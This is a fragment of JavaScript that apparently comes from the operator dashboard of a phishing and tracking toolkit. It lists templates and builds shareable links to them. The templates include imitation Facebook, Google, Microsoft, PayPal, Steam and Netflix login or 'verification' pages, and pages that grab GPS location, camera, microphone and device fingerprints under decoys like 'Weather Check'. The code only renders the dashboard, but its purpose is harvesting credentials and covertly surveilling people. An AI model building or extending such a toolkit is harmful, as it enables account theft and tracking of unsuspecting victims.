...
$(document).ready(function(){
    ...
    $.get("list_templates.php", function(response){
        var templates = JSON.parse(response);
        
        // Template icon and color mapping
        var templateInfo = {
            'advanced_location': { name: 'Advanced Location', icon: 'fa-map-marker-alt', color: '#e74c3c', bg: 'linear-gradient(135deg, #e74c3c 0%, #c0392b 100%)', desc: 'GPS tracking with interactive map' },
            'camera_temp': { name: 'Camera Access', icon: 'fa-camera', color: '#3498db', bg: 'linear-gradient(135deg, #3498db 0%, #2980b9 100%)', desc: 'Capture photos and videos' },
            'device_fingerprint': { name: 'Device Information', icon: 'fa-fingerprint', color: '#9b59b6', bg: 'linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%)', desc: 'Complete device information' },
            'discord': { name: 'Discord Verification', icon: 'fab fa-discord', color: '#5865f2', bg: 'linear-gradient(135deg, #5865f2 0%, #4752c4 100%)', desc: 'Discord account verification' },
            'facebook': { name: 'Facebook Login', icon: 'fab fa-facebook', color: '#1877f2', bg: 'linear-gradient(135deg, #1877f2 0%, #166fe5 100%)', desc: 'Facebook authentication' },
            'google': { name: 'Google Account', icon: 'fab fa-google', color: '#ea4335', bg: 'linear-gradient(135deg, #ea4335 0%, #d23321 100%)', desc: 'Google account recovery' },
            'microphone': { name: 'Audio Recorder', icon: 'fa-microphone', color: '#e67e22', bg: 'linear-gradient(135deg, #e67e22 0%, #d35400 100%)', desc: 'Record audio messages' },
            'microsoft': { name: 'Microsoft Account', icon: 'fab fa-microsoft', color: '#00a4ef', bg: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)', desc: 'Microsoft account sign-in' },
            'nearyou': { name: 'Near You', icon: 'fa-location-arrow', color: '#27ae60', bg: 'linear-gradient(135deg, #27ae60 0%, #229954 100%)', desc: 'Find nearby locations' },
            'netflix': { name: 'Netflix', icon: 'fa-film', color: '#e50914', bg: 'linear-gradient(135deg, #e50914 0%, #b20710 100%)', desc: 'Netflix membership' },
            'normal_data': { name: 'Data Collection', icon: 'fa-database', color: '#34495e', bg: 'linear-gradient(135deg, #34495e 0%, #2c3e50 100%)', desc: 'General data capture' },
            'paypal': { name: 'PayPal', icon: 'fab fa-paypal', color: '#0070ba', bg: 'linear-gradient(135deg, #0070ba 0%, #005ea6 100%)', desc: 'PayPal verification' },
            'spotify': { name: 'Spotify', icon: 'fab fa-spotify', color: '#1db954', bg: 'linear-gradient(135deg, #1db954 0%, #1ed760 100%)', desc: 'Spotify premium' },
            'steam': { name: 'Steam', icon: 'fab fa-steam', color: '#171a21', bg: 'linear-gradient(135deg, #171a21 0%, #1b2838 100%)', desc: 'Steam account access' },
            'twitter': { name: 'X (Twitter)', icon: 'fab fa-twitter', color: '#1d9bf0', bg: 'linear-gradient(135deg, #1d9bf0 0%, #0c8bd9 100%)', desc: 'X platform sign-in' },
            'weather': { name: 'Weather Check', icon: 'fa-cloud-sun', color: '#f39c12', bg: 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)', desc: 'Local weather information' }
        };
        
        for(let i = 0; i < templates.length; i++) {
            var templateKey = templates[i];
            var info = templateInfo[templateKey] || { 
                name: templateKey, 
                icon: 'fa-link', 
                color: '#667eea', 
            ...
            var url = "http://" + location.host + "/templates/" + templateKey + "/index.html";
            
            // Check if panel-v4/v5 is being used (has .link-card support)
            if ($('.dashboard-card').length > 0) {
                // Modern V4/V5 card style with icons
                $("#links").append(
                    '<div class="link-card" style="border-left: 4px solid ' + info.color + ';">' +
                        '<div style="display: flex; align-items: center; gap: 15px; flex: 1;">' +
                            '<div style="width: 50px; height: 50px; background: ' + info.bg + '; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">' +
                                '<i class="fas ' + info.icon + '"></i>' +
                            '</div>' +
                            '<div style="flex: 1;">' +
                                '<h5 style="margin: 0 0 5px 0; color: ' + info.color + ';">' + info.name + '</h5>' +
                                '<p style="margin: 0; font-size: 0.85rem; color: #666;">' + info.desc + '</p>' +
                                '<code style="font-size: 0.75rem; color: #999; word-break: break-all;">' + url + '</code>' +
                            '</div>' +
                        '</div>' +
                        '<button class="btn btn-primary-modern btn-modern cp-btn" data-link="' + url + '" style="margin: 0;">' +
                ...
                $("#links").append(
                    '<div class="mt-2 d-flex justify-content-center" >' +
                        '<p id="path" class="form-control m-1 w-50 ptext">' + url + '</p>' +
